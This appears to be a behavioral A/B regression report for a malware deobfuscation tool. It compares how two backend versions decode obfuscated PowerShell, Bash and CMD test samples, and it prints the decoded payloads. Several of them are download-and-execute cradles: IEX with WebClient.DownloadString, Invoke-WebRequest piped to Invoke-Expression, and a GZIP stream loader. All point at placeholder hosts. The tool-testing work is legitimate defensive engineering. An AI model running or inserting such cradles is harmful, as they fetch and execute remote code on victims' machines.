# Phase 3 · Behavioral A/B Report

Corpus version: **1.1.0**
Baseline tree : `/tmp/workspace-v1.5.6/backend/` (git `fff5897`, Jul 28 16:10 UTC)
Current tree  : `/app/backend/` (HEAD)

**No files were restored, forked, or wired during this phase.** This report
is pure runtime evidence produced by invoking `/api/decode/smart` on both trees.

## Comparison Table

| # | Sample | v1.5.6 | Current | Same? | First Divergence |
|---|--------|:------:|:-------:|:-----:|------------------|
| 1 | `S001_ps_writehost_tweet` — PowerShell -EncodedCommand (owner anchor · permanent) | PASS | PASS | ✅ | identical |
| 2 | `S01_ps_b64_utf16le` — Multi-layer PowerShell Base64 (UTF-16LE) | PASS | PASS | ❌ | interpreter differs |
| 3 | `S02_bash_xxd_b64_rev` — Bash → xxd → Base64 → rev | PASS | PASS | ❌ | interpreter differs |
| 4 | `S03_cmd_caret_escaped` — CMD ^-escaped | PASS | PASS | ❌ | interpreter differs |
| 5 | `S04_ps_alias_heavy` — PowerShell alias-heavy pipeline | PASS | PASS | ❌ | decoder_chain: at index 0 baseline='ps-string-concat' current='ps-reconstruct' |
| 6 | `S05_nested_b64_gzip` — Nested Base64 + GZIP | PASS | PASS | ❌ | decoder_chain: at index 2 baseline='gzip-decompress' current='crypto-detect' |
| 7 | `S06_xor_obfuscated` — XOR-obfuscated payload | PASS | PASS | ✅ | identical |
| 8 | `S07_rc4_openssl` — Crypto-wrapped payload (RC4/OpenSSL-style) | PASS | PASS | ❌ | decoder_chain: at index 0 baseline='extract-payload' current='rot47' |
| 9 | `S08_unicode_obfuscation` — Unicode / UTF obfuscation | PASS | PASS | ❌ | decoder_chain: CURRENT has extra op 'extract-payload' at index 0 |
| 10 | `S09_hex_b64_gzip_chain` — Mixed chain: Hex → Base64 → GZIP | PASS | PASS | ❌ | interpreter differs |
| 11 | `S10_bash_with_powershell_comment` — Bash with literal token 'powershell' inside a comment (interpreter-routing regression guard) | PASS | PASS | ❌ | interpreter differs |

## Per-Sample Stage Trace (❌ rows only)

### `S01_ps_b64_utf16le` — Multi-layer PowerShell Base64 (UTF-16LE)

- **First divergent stage:** `interpreter`
- **Baseline interpreter:** `None`  ·  **Current interpreter:** `powershell`

**Baseline decoder chain**
```
[
  "extract-b64",
  "utf16le-or-utf8-decode"
]
```

**Current decoder chain**
```
[
  "ps-encodedcommand-recovery",
  "extract-payload",
  "ioc-extract",
  "family-emotet"
]
```

**Baseline final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IEX(new-object net.webclient).downloadstring('http://example.com/stage1')

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Runtime Dependent · 55/100
  Engine:      archetype:PS_EncodedCommand · conf 55/100
  Chain:       extract-b64 → utf16le-or-utf8-decode

  MITRE ATT&CK
    T1059.001    · Execution
    T1027.010    · Defense Evasion
    T1105        · Command and Control

  LOLBIN       powershell.exe

  IOCs
    URL       http://example.com/stage1
    Domain    example.com

  Behavior
    1. Executes a Base64-encoded PowerShell command block

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Current final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
http://example.com/stage1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Runtime Dependent · 55/100
  Engine:      rc2-orchestrator · conf 55/100
  Chain:       ps-encodedcommand-recovery → extract-payload → ioc-extract → family-emotet

  MITRE ATT&CK
    T1059.001    · Execution
    T1027.010    · Defense Evasion
    T1105        · Command and Control

  LOLBIN       powershell.exe

  IOCs
    URL       http://example.com/stage1
    Domain    example.com

  Behavior
    1. Executes a Base64-encoded PowerShell command block

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### `S02_bash_xxd_b64_rev` — Bash → xxd → Base64 → rev

- **First divergent stage:** `interpreter`
- **Baseline interpreter:** `None`  ·  **Current interpreter:** `powershell`

**Baseline decoder chain**
```
[
  "extract-payload",
  "base64-decode"
]
```

**Current decoder chain**
```
[
  "powershell-alias-normalize"
]
```

**Baseline final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
302e302e312e3120202320706f7765727368656c6c comment

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Partial Decode · 20/100
  Engine:      smart · conf 20/100
  Chain:       extract-payload → base64-decode

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Current final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Write-Output 'MzAyZTMwMmUzMTJlMzEyMDIwMjMyMDcwNmY3NzY1NzI3MzY4NjU2YzZjIGNvbW1lbnQ=' | rev | base64 -d | xxd -r -p

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Suspicious · 55/100
  Engine:      rc2-orchestrator · conf 55/100
  Chain:       powershell-alias-normalize

  MITRE ATT&CK
    T1082        · Discovery

  LOLBIN       Expand.exe

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### `S03_cmd_caret_escaped` — CMD ^-escaped

- **First divergent stage:** `interpreter`
- **Baseline interpreter:** `None`  ·  **Current interpreter:** `cmd`

**Baseline decoder chain**
```
[
  "strip-carets",
  "extract-b64",
  "utf16le-or-utf8-decode"
]
```

**Current decoder chain**
```
[
  "cmd-runtime-reconstruct",
  "extract-payload",
  "base64-decode",
  "utf16le-or-utf8-decode"
]
```

**Baseline final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IEX('net.webclient')

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Suspicious · 60/100
  Engine:      archetype:CMD_CARET_OBFUSC+PS_EncodedCommand · conf 60/100
  Chain:       strip-carets → extract-b64 → utf16le-or-utf8-decode

  MITRE ATT&CK
    T1059.001    · Execution
    T1027.010    · Defense Evasion
    T1059.003    · Execution
    T1105        · Command and Control

  LOLBIN       powershell.exe, cmd.exe

  Behavior
    1. Executes PowerShell (T1059.001)
    2. Transfers a tool from a remote host (T1105)

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Current final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IEX('net.webclient')

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Suspicious · 60/100
  Engine:      rc2-orchestrator · conf 60/100
  Chain:       cmd-runtime-reconstruct → extract-payload → base64-decode → utf16le-or-utf8-decode

  MITRE ATT&CK
    T1059.001    · Execution
    T1027.010    · Defense Evasion
    T1059.003    · Execution
    T1105        · Command and Control

  LOLBIN       powershell.exe, cmd.exe

  Behavior
    1. Executes PowerShell (T1059.001)
    2. Transfers a tool from a remote host (T1105)

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### `S04_ps_alias_heavy` — PowerShell alias-heavy pipeline

- **First divergent stage:** `decoder_chain`
- **Baseline interpreter:** `powershell`  ·  **Current interpreter:** `powershell`

**Baseline decoder chain**
```
[
  "ps-string-concat"
]
```

**Current decoder chain**
```
[
  "ps-reconstruct",
  "powershell-alias-normalize",
  "ioc-extract"
]
```

**Baseline final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$a=http://example.com/x; iwr $a -useb | iex

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Runtime Dependent · 55/100
  Engine:      archetype:PS_STRING_CONCAT · conf 55/100
  Chain:       ps-string-concat

  MITRE ATT&CK
    T1105        · Command and Control
    T1059.001    · Execution

  IOCs
    URL       http://example.com/x
    Domain    ample.com
    Domain    example.com

  Behavior
    1. Downloads remote content via WebClient / Invoke-WebRequest

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Current final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$a='http://example.com/x'; Invoke-WebRequest 'http://example.com/x' -useb | Invoke-Expression

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Runtime Dependent · 55/100
  Engine:      rc2-orchestrator · conf 55/100
  Chain:       ps-reconstruct → powershell-alias-normalize → ioc-extract

  MITRE ATT&CK
    T1105        · Command and Control
    T1059.001    · Execution

  LOLBIN       powershell.exe, Expand.exe

  IOCs
    URL       http://example.com/x
    Domain    example.com

  Behavior
    1. Downloads remote content via WebClient / Invoke-WebRequest

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### `S05_nested_b64_gzip` — Nested Base64 + GZIP

- **First divergent stage:** `decoder_chain`
- **Baseline interpreter:** `None`  ·  **Current interpreter:** `None`

**Baseline decoder chain**
```
[
  "extract-payload",
  "base64-decode",
  "gzip-decompress"
]
```

**Current decoder chain**
```
[
  "extract-payload",
  "base64-decode",
  "crypto-detect"
]
```

**Baseline final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ INVESTIGATION BRAIN · RTE DECODER TRACE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  stop_reason:      no_transformation
  depth:            1   layers: 2   steps: 1
  determinism_hash: 106e098eb6122b8b
  step: ps_static_base64  L0→L1  conf=93

  DIAGNOSTICS:
    [   INFO] DX2002 NO_FURTHER_DETERMINISTIC_TRANSFORMATION  (root)
             The Recursive Transformation Engine could not find any deterministic transformation to apply to the current layer. This is the principled convergence state; the artefact is treated as effective plaintext for downstream a
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ RECOVERED PAYLOAD (final RTE layer)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$b='謟  ̀칋⷏ⱈ䤪刭칈⷏⴨⤮⠭䷈ⷍ䯍䵎䎗⿽ '; $ms=New-Object IO.MemoryStream(,$b); $gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); $sr=New-Object IO.StreamReader($gz); IEX $sr.ReadToEnd()
```

**Current final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ INVESTIGATION BRAIN · RTE DECODER TRACE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  stop_reason:      no_transformation
  depth:            1   layers: 2   steps: 1
  determinism_hash: 106e098eb6122b8b
  step: ps_static_base64  L0→L1  conf=93

  DIAGNOSTICS:
    [   INFO] DX2002 NO_FURTHER_DETERMINISTIC_TRANSFORMATION  (root)
             The Recursive Transformation Engine could not find any deterministic transformation to apply to the current layer. This is the principled convergence state; the artefact is treated as effective plaintext for downstream a
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ RECOVERED PAYLOAD (final RTE layer)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
$b='謟  ̀칋⷏ⱈ䤪刭칈⷏⴨⤮⠭䷈ⷍ䯍䵎䎗⿽ '; $ms=New-Object IO.MemoryStream(,$b); $gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); $sr=New-Object IO.StreamReader($gz); IEX $sr.ReadToEnd()
```

### `S07_rc4_openssl` — Crypto-wrapped payload (RC4/OpenSSL-style)

- **First divergent stage:** `decoder_chain`
- **Baseline interpreter:** `None`  ·  **Current interpreter:** `None`

**Baseline decoder chain**
```
[
  "extract-payload"
]
```

**Current decoder chain**
```
[
  "rot47"
]
```

**Baseline final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
U2FsdGVkX1+abcdef012345/RC4WrappedPayload==

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Undecoded · 0/100
  Engine:      smart · conf 0/100
  Chain:       extract-payload

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Current final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@A6?DD= 6?4 \C4c \z e3edfh \:? \ kkk V&auD5v'<)`Z234567_`abcd^#rc(C2AA65!2J=@25llV

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Partial Decode · 20/100
  Engine:      rc2-orchestrator · conf 20/100
  Chain:       rot47

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### `S08_unicode_obfuscation` — Unicode / UTF obfuscation

- **First divergent stage:** `decoder_chain`
- **Baseline interpreter:** `None`  ·  **Current interpreter:** `None`

**Baseline decoder chain**
```
[]
```

**Current decoder chain**
```
[
  "extract-payload",
  "ioc-extract",
  "family-emotet"
]
```

**Baseline final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY  (payload already plaintext — no decode needed)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Runtime Dependent · 55/100
  Engine:      magic · conf 55/100

  MITRE ATT&CK
    T1105        · Command and Control
    T1059.001    · Execution

  LOLBIN       powershell.exe

  IOCs
    URL       http://ex.com/a
    Domain    ex.com

  Behavior
    1. Downloads remote content via WebClient / Invoke-WebRequest

  Original input preserved above in the INPUT box ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Current final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
http://ex.com/a

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Runtime Dependent · 55/100
  Engine:      rc2-orchestrator · conf 55/100
  Chain:       extract-payload → ioc-extract → family-emotet

  MITRE ATT&CK
    T1105        · Command and Control
    T1059.001    · Execution

  LOLBIN       powershell.exe

  IOCs
    URL       http://ex.com/a
    Domain    ex.com

  Behavior
    1. Downloads remote content via WebClient / Invoke-WebRequest

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### `S09_hex_b64_gzip_chain` — Mixed chain: Hex → Base64 → GZIP

- **First divergent stage:** `interpreter`
- **Baseline interpreter:** `powershell`  ·  **Current interpreter:** `None`

**Baseline decoder chain**
```
[
  "hex-decode",
  "base58-decode",
  "xor-brute",
  "powershell-backtick-normalize",
  "powershell-alias-normalize"
]
```

**Current decoder chain**
```
[
  "hex-decode",
  "base64-decode"
]
```

**Baseline final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ INVESTIGATION BRAIN · RTE DECODER TRACE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  stop_reason:      no_transformation
  depth:            3   layers: 4   steps: 3
  determinism_hash: f534bcb3d17d8c4d
  step: hex_string  L0→L1  conf=80
  step: base64_bytes  L1→L2  conf=55
  step: base64_bytes  L2→L3  conf=55

  DIAGNOSTICS:
    [   INFO] DX2002 NO_FURTHER_DETERMINISTIC_TRANSFORMATION  (root)
             The Recursive Transformation Engine could not find any deterministic transformation to apply to the current layer. This is the principled convergence state; the artefact is treated as effective plaintext for downstream a
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ RECOVERED PAYLOAD (final RTE layer)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
d5ff36f34d34d34d34d34d34d34f767f46db71c6f67f671c6bd71f
```

**Current final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ INVESTIGATION BRAIN · RTE DECODER TRACE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  stop_reason:      no_transformation
  depth:            3   layers: 4   steps: 3
  determinism_hash: f534bcb3d17d8c4d
  step: hex_string  L0→L1  conf=80
  step: base64_bytes  L1→L2  conf=55
  step: base64_bytes  L2→L3  conf=55

  DIAGNOSTICS:
    [   INFO] DX2002 NO_FURTHER_DETERMINISTIC_TRANSFORMATION  (root)
             The Recursive Transformation Engine could not find any deterministic transformation to apply to the current layer. This is the principled convergence state; the artefact is treated as effective plaintext for downstream a
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ RECOVERED PAYLOAD (final RTE layer)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
d5ff36f34d34d34d34d34d34d34f767f46db71c6f67f671c6bd71f
```

### `S10_bash_with_powershell_comment` — Bash with literal token 'powershell' inside a comment (interpreter-routing regression guard)

- **First divergent stage:** `interpreter`
- **Baseline interpreter:** `None`  ·  **Current interpreter:** `powershell`

**Baseline decoder chain**
```
[]
```

**Current decoder chain**
```
[
  "powershell-alias-normalize"
]
```

**Baseline final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY  (payload already plaintext — no decode needed)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Undecoded · 0/100
  Engine:      magic · conf 0/100

  Original input preserved above in the INPUT box ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Current final output**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▼ DECODED OUTPUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Write-Output 'hello world'  # note: this is not powershell

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NIVXRAY INVESTIGATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Verdict:     Partial Decode · 20/100
  Engine:      rc2-orchestrator · conf 20/100
  Chain:       powershell-alias-normalize

  LOLBIN       Expand.exe

  Per-layer decoded outputs available in the Chain / Trace panel ↑
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
